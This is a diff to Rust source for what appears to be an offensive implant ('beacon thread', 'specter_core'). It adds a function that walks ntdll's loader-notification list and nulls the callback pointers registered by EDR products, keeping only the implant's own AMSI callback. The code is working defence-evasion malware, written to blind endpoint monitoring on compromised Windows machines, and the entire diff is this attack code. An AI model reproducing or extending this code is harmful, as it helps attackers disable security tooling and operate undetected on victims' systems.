@@ -121,3 +121,47 @@ pub unsafe fn install(peb: *mut Peb, ntdll: *mut c_void, sys: &Syscalls, hooks: 
         &mut cookie,
     );
 }
+
+/// dll-notify: unhook every FOREIGN loader-notification callback
+/// (EDR-registered ones) by nulling their `Function` pointer in
+/// `ntdll!LdrpNotificationList`, keeping our own AMSI callback. The list
+/// links are left untouched (no unlink race); a null Function is skipped by
+/// the loader. Returns the number of callbacks disabled.
+///
+/// # Safety
+///
+/// `ntdll` must be the mapped ntdll base; runs once at bootstrap on the
+/// beacon thread.
+pub unsafe fn unhook_foreign_notifications(ntdll: *mut c_void) -> usize {
+    let register = specter_core::peb::find_export(ntdll, H_LDR_REGISTER_DLL_NOTIFICATION);
+    if register.is_null() {
+        return 0;
+    }
+    let base = ntdll as usize;
+    let end = base.wrapping_add(0x400_000); // ntdll image < 4 MiB
+    let stub = core::slice::from_raw_parts(register as *const u8, 0x100);
+    let Some(list) = specter_core::amsi::notification_list_addr(register as usize, stub, base, end)
+    else {
+        return 0;
+    };
+    // LIST_ENTRY walk: entry base == &NotificationList (offset 0),
+    // Function at +0x10. Bounded; every link validated in-range.
+    let ours = spt_ldr_notification as *const () as usize;
+    let mut count = 0usize;
+    let mut cur = (list as *const usize).read_unaligned(); // Flink
+    let mut guard = 0usize;
+    while cur != list && guard < 64 {
+        let entry = cur;
+        if entry < base || entry >= end {
+            break; // corrupt link: stop without touching anything
+        }
+        let func = (entry as *const usize).add(2).read_unaligned(); // +0x10
+        if func != 0 && func != ours {
+            (entry as *mut usize).add(2).write_unaligned(0);
+            count += 1;
+        }
+        cur = (entry as *const usize).read_unaligned();
+        guard += 1;
+    }
+    count
+}
